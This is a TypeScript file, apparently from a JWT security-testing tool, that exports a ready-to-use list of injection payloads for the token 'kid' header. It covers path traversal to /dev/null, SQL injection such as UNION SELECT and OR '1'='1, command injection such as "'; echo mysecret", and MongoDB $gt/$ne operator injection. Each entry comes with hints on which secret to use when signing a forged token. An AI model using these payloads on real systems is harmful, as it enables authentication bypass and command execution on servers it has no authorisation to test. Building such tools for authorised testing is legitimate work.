import type { KidPayload } from '../types/crypto.types'

export const KID_PAYLOADS: KidPayload[] = [
  // ── Path Traversal ──────────────────────────────────────────
  // Server reads key from file: open(f"/keys/{kid}.pem").read()
  {
    category: 'path-traversal',
    label: '/dev/null → empty key',
    value: '../../dev/null',
    secretHint: '/dev/null is always empty → sign with empty secret',
    secretValue: '',
  },
  {
    category: 'path-traversal',
    label: '../../dev/null (URL-encoded)',
    value: '..%2F..%2Fdev%2Fnull',
    secretHint: 'Same as above, URL-encoded variant',
    secretValue: '',
  },

  // ── SQL Injection ───────────────────────────────────────────
  // Server looks up key: SELECT key FROM keys WHERE kid = '{kid}'
  {
    category: 'sqli',
    label: "UNION SELECT → controlled key",
    value: "' UNION SELECT 'mysecret' --",
    secretHint: "You control the key: sign with 'mysecret'",
    secretValue: 'mysecret',
  },
  {
    category: 'sqli',
    label: "OR '1'='1 → first key in DB",
    value: "' OR '1'='1",
    secretHint: "Returns the first key in the table — you need to know (or guess) what it is",
    secretValue: '',
  },
  {
    category: 'sqli',
    label: "Comment-out → admin key",
    value: "admin' --",
    secretHint: "Returns key for user 'admin' — you need to know admin's key",
    secretValue: '',
  },

  // ── Command Injection ───────────────────────────────────────
  // Server does: os.popen(f"cat /keys/{kid}.pem").read()
  {
    category: 'command-injection',
    label: 'echo → controlled key',
    value: "'; echo mysecret",
    secretHint: "Outputs 'mysecret' as the key → sign with 'mysecret'",
    secretValue: 'mysecret',
  },
  {
    category: 'command-injection',
    label: '/dev/null → empty key',
    value: '; cat /dev/null',
    secretHint: '/dev/null is empty → sign with empty secret',
    secretValue: '',
  },

  // ── NoSQL Injection ─────────────────────────────────────────
  // Server queries MongoDB: db.keys.findOne({ kid: kid })
  {
    category: 'nosql',
    label: '$gt → bypass query',
    value: '{"$gt": ""}',
    secretHint: 'Bypasses the query — returns some key. You need to know which one.',
    secretValue: '',
  },
  {
    category: 'nosql',
    label: '$ne → bypass query',
    value: '{"$ne": null}',
    secretHint: 'Bypasses the query — returns a key where kid ≠ null.',
    secretValue: '',
  },
]

export const KID_CATEGORIES = [
  { value: 'path-traversal', label: 'Path Traversal' },
  { value: 'sqli', label: 'SQL Injection' },
  { value: 'command-injection', label: 'Command Injection' },
  { value: 'nosql', label: 'NoSQL Injection' },
] as const

export type KidCategory = (typeof KID_CATEGORIES)[number]['value']
